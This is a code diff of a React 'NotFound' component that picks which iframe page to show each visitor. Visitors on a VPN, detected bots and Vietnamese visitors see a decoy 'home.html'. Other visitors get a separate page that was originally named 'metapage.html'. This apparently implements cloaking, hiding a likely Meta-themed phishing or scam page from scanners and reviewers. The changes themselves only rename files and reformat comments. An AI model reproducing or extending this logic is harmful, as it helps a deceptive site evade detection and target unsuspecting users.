@@ -26,7 +26,7 @@ function NotFound() {
   }
  
   // async function fetchHtml() {
-  //   SetHtmlLandingPage(await (await fetch(`homepage.html`)).text());
+  //   SetHtmlLandingPage(await (await fetch(`home.html`)).text());
   // }
 
   const setLocaltion =  () => {
@@ -38,10 +38,10 @@ function NotFound() {
         if(privacy){
           if(
             privacy.vpn == true
-           //|| privacy.hosting == true
-           //|| privacy.relay == true
-          // || privacy.tor == true
-          // || privacy.proxy == true
+          //   || privacy.hosting == true
+          //   || privacy.relay == true
+          //   || privacy.tor == true
+          //  || privacy.proxy == true
           ){
             SetUserHiden(true);
           }
@@ -67,7 +67,7 @@ function NotFound() {
     && !isbot(userAgent)){
     if(IsUserHiden){
       //return (<div dangerouslySetInnerHTML={{ __html: HtmlLandingPage }}></div>)
-      return(showIframe("homepage.html"));
+      return(showIframe("home.html"));
     }else{
       if(countryCode.length == 0){
         return(           
@@ -77,14 +77,14 @@ function NotFound() {
         );
       }else{
         if(countryCode.includes('vn')){
-          return(showIframe("homepage.html"));
+          return(showIframe("home.html"));
         }else{
-            return(showIframe("metapage.html"));
+            return(showIframe("contact.html"));
         }
       }
     }
   }else{
-    return(showIframe("homepage.html"));
+    return(showIframe("home.html"));
   }
 }
 
